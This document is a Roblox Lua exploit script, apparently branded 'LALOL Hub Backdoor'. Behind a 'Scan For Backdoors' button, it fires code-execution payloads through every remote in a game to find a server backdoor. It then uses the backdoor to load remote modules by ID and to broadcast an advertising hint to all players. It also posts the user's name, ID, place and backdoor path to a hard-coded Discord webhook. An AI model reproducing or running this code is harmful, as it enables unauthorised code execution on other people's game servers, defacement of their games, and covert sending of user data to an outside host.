--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 8 | Scripts: 1 | Modules: 0 | Tags: 0
local G2L = {};

-- ServerScriptService.UndetectedNebula
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Enabled"] = true;
G2L["1"]["Name"] = [[UndetectedNebula]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- ServerScriptService.UndetectedNebula.Scan
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Visible"] = false;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(54, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 382, 0, 254);
G2L["2"]["Position"] = UDim2.new(0.34007, 0, 0.29563, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Scan]];


-- ServerScriptService.UndetectedNebula.Scan.UIGradient
G2L["3"] = Instance.new("UIGradient", G2L["2"]);
G2L["3"]["Rotation"] = 145;
G2L["3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(122, 122, 122))};


-- ServerScriptService.UndetectedNebula.Scan.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- ServerScriptService.UndetectedNebula.Scan.TextButton
G2L["5"] = Instance.new("TextButton", G2L["2"]);
G2L["5"]["TextWrapped"] = true;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextScaled"] = true;
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Jura.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["5"]["Size"] = UDim2.new(0, 270, 0, 97);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Scan For Backdoors]];
G2L["5"]["Position"] = UDim2.new(0.1466, 0, 0.30709, 0);


-- ServerScriptService.UndetectedNebula.Scan.TextButton.UICorner
G2L["6"] = Instance.new("UICorner", G2L["5"]);



-- ServerScriptService.UndetectedNebula.Scan.TextButton.Scan LOL
G2L["7"] = Instance.new("LocalScript", G2L["5"]);
G2L["7"]["Name"] = [[Scan LOL]];


-- ServerScriptService.UndetectedNebula.Scan.UIDragDetector
G2L["8"] = Instance.new("UIDragDetector", G2L["2"]);



-- ServerScriptService.UndetectedNebula.Scan.TextButton.Scan LOL
local function C_7()
local script = G2L["7"];
	local HttpService = game:GetService("HttpService")
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
	local backdoor = nil
	local plr = game:GetService("Players").LocalPlayer
	
	function debug(text, lvl)
		local func = print
		if lvl == 1 then func = print end
		if lvl == 2 then func = error end
		if lvl == 3 then func = warn end
		func('LALOL Hub Backdoor: '..text)
	end
	
	function runRemote(remote, data)
		if remote:IsA('RemoteEvent') then
			remote:FireServer(data)
		elseif remote:IsA('RemoteFunction') then
			spawn(function() remote:InvokeServer(data) end)
		end
	end
	
	function generateName(length)
		local text = ''
		for i = 1, length do
			text = text .. alphabet[math.random(1, #alphabet)]
		end
		return text
	end
	
	function findRemote()
		local timee = os.clock()
		local remotes = {}
	
		local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			while true do
				code = generateName(math.random(12, 30))
				if not remotes[code] then break end
			end
			spawn(function() 
				protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
			end)
			remotes[code] = protected_backdoor
		end
	
		for _, remote in game:GetDescendants() do
	
			if not (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then 
				continue 
			end
	
			if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
				continue
			end
	
			if remote.Parent == game:GetService("ReplicatedStorage") or 
				remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
				remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
	
				if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
					debug('Adonis filter detected ('..remote.Name..')', 1)
					continue
				end
	
				if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
					debug('HD Admin ('..remote.Name..')', 1)
					continue
				end
	
				if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
					debug('Chat event ('..remote.Name..')', 1)
					continue
				end
			end
	
			while true do
				code = generateName(math.random(12, 30))
				if not remotes[code] then break end
			end
	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
			remotes[code] = remote
			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
		end
	
		for i = 1, 100 do
			for code, remote in remotes do
				if workspace:FindFirstChild(code) then
					backdoor = remote
					debug(remote:GetFullName(), 3)
	
					script.Parent.Parent.Parent:Destroy()
	
					runRemote(remote, "require(171016405.1884*69)")
					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
	
					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
						request({
							Url = 'https://discord.com/api/webhooks/1108694160464158781/9VCz_ck4ux3M3TQj8moLDq3Nw-dkYDW7gEcaLHKPbe2_JJIz5m2fEh6eSnp33WOLtgi1',
							Method = 'POST',
							Headers = {
								['Content-Type'] = 'application/json',
							},
							Body = HttpService:JSONEncode({
								username = 'pls dont delete this w3bh00k',
								content = "**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
							})
						})
					end
	
					require(115802010927944)(plr.Name)
	
					return true
				end
			end
			wait()
		end
	
		return false
	end
	
	findRemote()
end;
task.spawn(C_7);

return G2L["1"], require;
